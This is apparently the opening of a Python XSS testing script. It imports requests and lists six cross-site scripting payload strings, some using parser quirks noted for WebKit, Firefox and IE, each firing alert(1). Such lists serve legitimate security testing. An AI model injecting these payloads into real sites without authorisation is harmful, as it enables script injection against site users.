# -- coding:utf8 -- #
import requests

payloads = ['<script>alert(1)</script>',
            '<title><a href="</title><img src=x onerror=alert(1)//">',
            '<? foo="><script>alert(1)</script>">',    # webkit and firefox
            '<! foo="><script>alert(1)</script>">',
            '</ foo="><script>alert(1)</script>">',
            '<% foo="><script>alert(1)</script>">',    # IE
            ]
